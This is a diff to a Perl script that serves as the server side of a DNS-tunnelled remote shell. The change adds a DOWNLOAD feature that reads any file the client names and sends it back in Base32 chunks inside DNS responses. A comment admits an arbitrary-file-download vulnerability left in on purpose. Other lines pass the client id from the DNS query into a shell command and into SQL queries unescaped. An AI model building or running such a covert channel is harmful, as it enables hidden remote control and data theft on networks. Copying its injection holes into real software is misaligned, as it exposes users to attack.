@@ -6,14 +6,12 @@
 #
 ###############################
 # Known Bugs:
-# * Can not change directories
-# * Can not run apps in interactive mode. Client will hang
+#
 #
 ###############################
 use warnings;
 use strict;
 use Net::DNS::Nameserver;
-#use threads;
 use MIME::Base32 qw ( RFC ); 
 use DBI;
 
@@ -22,7 +20,8 @@ use DBI;
 ###############################
 my $debug;
 my @clients;
-#my %message_buffer;
+my $dfile_name;
+my $ufile_name;
 
 ###############################
 # Parse User Arguments
@@ -61,9 +60,7 @@ sub reply_handler {
 	my ($qname, $qclass, $qtype, $peerhost,$query,$conn) = @_;
 	my ($rcode, @ans, @auth, @add);
 
-	print "########################################################\n";
-	print "Received query from $peerhost to ". $conn->{sockhost}. "\n";
-	#$query->print;
+	debug("#", "########################################################");
 
 	if ($qtype eq "A" && $qname eq "foo.example.com" ) {
 		my ($ttl, $rdata) = (3600, "10.1.2.3");
@@ -97,6 +94,7 @@ sub reply_handler {
 		}
 		if(!$client_exsist) {
 			debug("New Client", $client_id);			
+			print "Connect to client via server-shell.pl --id=$client_id\n";
 			push(@clients, $client_id);
 			my $err = `sqlite3 $client_id.db "CREATE TABLE msg_queue (CLIENT_MSG_QUEUE varchar(4096), SERVER_MSG_QUEUE varchar(4096));"`;
 			if ($err) {
@@ -123,6 +121,56 @@ sub reply_handler {
 		} else {
 			debug("Exsisting Client", $client_id);
 		}
+		
+		# if cmd is to download a file
+		# Yes there is a vuln here to download any arbitray file!
+		if ($client_cmd eq "DOWNLOAD") {
+			my $rmsg_encoded = "DOWNLOAD\.";
+			my $chunk_size = 75;
+			my $chunk = 0;
+			my $sent_chunk = 0;
+			my $client_msg_decoded = MIME::Base32::decode($client_msg);
+			if ($client_msg_decoded =~ /DFILE_NAME:(.*)/) {
+				$dfile_name = $1;
+			} elsif ($client_msg_decoded =~ /CONTENT:(\d+)/) {
+				$chunk = $1;
+			} else {
+				debug("CLIENT_MSG_DECODED", $client_msg_decoded);
+			}
+
+                        open DFILE, "$dfile_name" or debug("DOWNLOAD FILE", $!);
+			#my $mydir = `pwd`;
+			debug("DFILE_NAME", $dfile_name);
+			debug("CHUNK", $chunk);
+       	                binmode DFILE;
+                        my ($data, $n, $offset);
+               	        my $cnt = 0;
+			my $data_encoded;
+       	                while (($n = read DFILE, $data, $chunk_size) != 0) {
+                                if($chunk eq $cnt) {
+               	                        $data_encoded = MIME::Base32::encode($data);
+					$sent_chunk = 1;
+               	                }
+       	                        $cnt++;
+                        }
+                        close DFILE;
+                        if ($sent_chunk) {
+                        	$rmsg_encoded .= MIME::Base32::encode("CONTENT:$data_encoded"); 
+                        } else {
+				$rmsg_encoded .= MIME::Base32::encode("DONE");
+			}			
+
+
+                	if ($client_msg_decoded !~ /DONE/ ) {
+				my ($ttl, $rdata) = (1, $rmsg_encoded);
+        	        	my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
+                		push @ans, $rr;
+                		$rcode = "NOERROR";
+       				# mark the answer as authoritive (by setting the 'aa' flag
+        			return ($rcode, \@ans, \@auth, \@add, { aa => 1 });
+			}
+		}
+		##############################
 
 		# insert part
 		debug("CLIENT MSG_BUFF: $part", $client_msg);
@@ -147,7 +195,6 @@ sub reply_handler {
 			#msg complete
 			# Assemble msg and put into queue
 			$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
-                        #$sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='$client_msg'");	
 			my $reassembled_message_encoded = '';
 			for (my $seq = 1; $seq <= $parts; $seq++) {
 				$sth = $dbh->prepare("SELECT PART FROM msg_buff WHERE SEQ = '$seq'");
@@ -168,7 +215,6 @@ sub reply_handler {
 
 			#die;
 			# Update CMD
-			debug("CMD", "UPDATE");
                         $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
                         $sth = $dbh->prepare("UPDATE cmd_queue SET CLIENT_CMD='$client_cmd'");
                         $sth->execute();
@@ -176,7 +222,6 @@ sub reply_handler {
                         $dbh->disconnect();
 
 			# client msg queue
-	                debug("CLIENT MESSAGE QUEUE", "UPDATE");
         	        $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
 	                $sth = $dbh->prepare("UPDATE msg_queue SET CLIENT_MSG_QUEUE='$reassembled_message_encoded'");
 			$sth->execute();
@@ -184,7 +229,6 @@ sub reply_handler {
 	                $dbh->disconnect();
 
 			# Remove message from msg_buff
-                        debug("CLIENT MSG_BUFF", "CLEAR");
                         $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $!;
                         $sth = $dbh->prepare("DELETE FROM msg_buff");
                         $sth->execute();
@@ -192,21 +236,18 @@ sub reply_handler {
                         $dbh->disconnect();
 
 			# Get SRV Command
-                        debug("CMD_QUEUE", "READ");
                         $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
                         $sth = $dbh->prepare("SELECT SERVER_CMD FROM cmd_queue");
                         $sth->execute();
 
                         my @row = $sth->fetchrow_array();
                         if ($row[0]) {
-                                debug("SRV CMD MSG", $row[0]);
                                 $rmsg_encoded = $row[0];
                         }
                         $sth->finish();
                         $dbh->disconnect();
 
 			# Pop srv cmd off the stack
-                        debug("COMMAND MESSAGE QUEUE", "CLEARED");
                         $dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
                         $sth = $dbh->prepare("UPDATE cmd_queue SET SERVER_CMD = 'NULL'");
                         $sth->execute();
@@ -214,12 +255,10 @@ sub reply_handler {
                         $dbh->disconnect();
 
 	                # Get SRV Responce
-        	        debug("SERVER MESSAGE_QUEUE", "READ");
                 	$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
 	                $sth = $dbh->prepare("SELECT SERVER_MSG_QUEUE FROM msg_queue");
         	        $sth->execute();
 	
-        	        #$rmsg_encoded = MIME::Base32::encode("NULL");
                 	@row = $sth->fetchrow_array();
 	                if ($row[0]) {
         	                debug("ENCODING SRV MSG", $row[0]);
@@ -229,7 +268,6 @@ sub reply_handler {
                 	$dbh->disconnect();
 
 	                # Pop off the stack
-        	        debug("SERVER MESSAGE QUEUE", "CLEARED");
                 	$dbh = DBI->connect("dbi:SQLite:$client_id.db") or die $DBI::errstr;
  	                $sth = $dbh->prepare("UPDATE msg_queue SET SERVER_MSG_QUEUE = 'NULL'");
         	        $sth->execute();
